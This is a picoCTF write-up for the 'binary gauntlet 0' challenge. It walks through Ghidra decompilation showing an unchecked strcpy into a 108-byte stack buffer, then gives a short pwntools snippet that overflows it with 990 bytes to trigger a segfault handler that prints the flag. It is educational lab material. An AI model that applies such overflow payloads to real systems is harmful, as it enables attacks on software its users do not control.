<!--
---
slug: "picoctf-binary-gauntlet-0"
title: "picoCTF — binary gauntlet 0"
date: "2026-07-06"
ctf: "picoCTF"
challenge: "binary gauntlet 0"
tags: ["ret2win", "pwn", "buffer overflow"]
tools: ["pwntools", "ghidra"]
summary: "Using Ghidra to reverse a binary and find it's vulnerabilites."
---
-->

# picoCTF — binary gauntlet 0

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | ret2win |
| Topics | Stack buffer overflow |
| Tools | pwntools, Ghidra |

---

## Reversing Binary with Ghidra

I started this challenge by reversing the binary with Ghidra. The reversed C code for the `main` function shows both the behavior and the main vulnerability of the binary.

The program starts by using `fgets` to store the user input in a 1000 byte buffer, and prints this buffer. Then the program uses `fgets` again to store a new user input in the same 1000 byte buffer, and uses `strcpy` to copy this buffer into a smaller 108 byte buffer. `strcpy` does not verify the buffer's size before copying the contents into it, making the program vulnerable to a buffer overflow. Furthermore, because the smaller buffer is declared in the first command of the function, it is stored right below the function header on the stack.

```c
char local_88 [108];
fgets(local_10,1000,stdin); //reads user input into local_10
local_10[999] = '\0';
printf(local_10); //prints local_10
fflush(stdout);
fgets(local_10,1000,stdin); //reads user input into local_10
local_10[999] = '\0';
strcpy(local_88,local_10); //copies local_10 into local_88
return 0
```

There is also a function called `sigsegv_handler` which prints the value of the flag.

```c
fprintf(stderr,"%s\n",flag);
```

This function is called by the `main` function if a segmentation fault (buffer overflow) is detected.

```c
signal(0xb,sigsegv_handler);
```

Hence, the goal of this challenge is to trigger a segmentation fault by copying a value greater than 108 bytes into the local_88 buffer.

---

## Writing the Exploit

I used pwntools and python to write my exploit.

In my exploit, I followed the same process as described above: write an input of any size, wait until said input is printed, write an input larger than 108 to trigger a Segmentation Fault.

```python
payload = b'A' * 990
p.sendline(payload)
p.recvuntil(payload)
p.sendline(payload)
```

Running my exploit prints the flag.

---

## What I Learned

- **Using Ghidra to reverse a binary** This was my first time using Ghidra to reverse a binary. By reversing the binary, I was able to better understand what the program did and what its vulnerabilities are.

---

## References

- [picoCTF - binary gauntlet 0](https://learn.cylabacademy.org/library/167?page=1&workspace=true)
